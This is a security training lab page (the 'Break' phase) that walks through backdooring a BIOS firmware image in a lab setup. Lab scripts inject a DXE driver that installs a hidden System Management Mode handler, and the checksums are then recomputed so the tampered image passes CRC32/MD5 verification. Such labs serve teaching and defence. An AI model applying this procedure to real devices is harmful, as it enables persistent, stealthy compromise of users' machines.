# Lab 6.3: Firmware & Hardware Supply Chain

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Backdooring a Firmware Update

**Goal:** Modify a firmware image to include a persistent backdoor that survives the update verification process.

### Step 1: Extract and inspect

```bash
cp /app/firmware/bios-v1.2.0.bin /tmp/firmware-work.bin
strings /tmp/firmware-work.bin | grep -i "DXE\|driver\|boot"
hexdump -C /tmp/firmware-work.bin | tail -20
```

### Step 2: Inject a backdoor DXE driver

A DXE (Driver Execution Environment) driver runs during the boot process before the OS loads. Injecting code here means it survives OS reinstalls.

```bash
cat /app/attacks/malicious-dxe-driver.py

python3 /app/attacks/inject_firmware.py \
    --input /tmp/firmware-work.bin \
    --payload /app/attacks/backdoor.efi \
    --output /tmp/firmware-backdoored.bin
```

The injected DXE driver runs during early boot, before the OS loads. It installs a System Management Mode handler that survives OS reinstalls, intercepts SMI calls, can read/write physical memory, and is invisible to OS-level security tools.

### Step 3: Bypass the update verification

```bash
python3 /app/attacks/fix_checksum.py /tmp/firmware-backdoored.bin
/app/firmware/verify_update.sh /tmp/firmware-backdoored.bin
```

If the vendor only checks CRC32 or MD5, recalculating the checksum after modification is trivial.

### Step 4: Compare legitimate vs. backdoored firmware

```bash
python3 - << 'PYEOF'
with open("/app/firmware/bios-v1.2.0.bin", "rb") as f1, \
     open("/tmp/firmware-backdoored.bin", "rb") as f2:
    orig = f1.read()
    back = f2.read()
    diffs = [(i, orig[i], back[i]) for i in range(min(len(orig), len(back))) if orig[i] != back[i]]
    print(f"Files differ at {len(diffs)} byte positions")
    print(f"Original size: {len(orig)}, Modified size: {len(back)}")
    if diffs:
        print(f"First diff at offset 0x{diffs[0][0]:x}: 0x{diffs[0][1]:02x} -> 0x{diffs[0][2]:02x}")
PYEOF
```

> **Checkpoint:** The backdoored firmware should pass the vendor's checksum verification. Run `/app/firmware/verify_update.sh /tmp/firmware-backdoored.bin` and confirm it reports "valid".
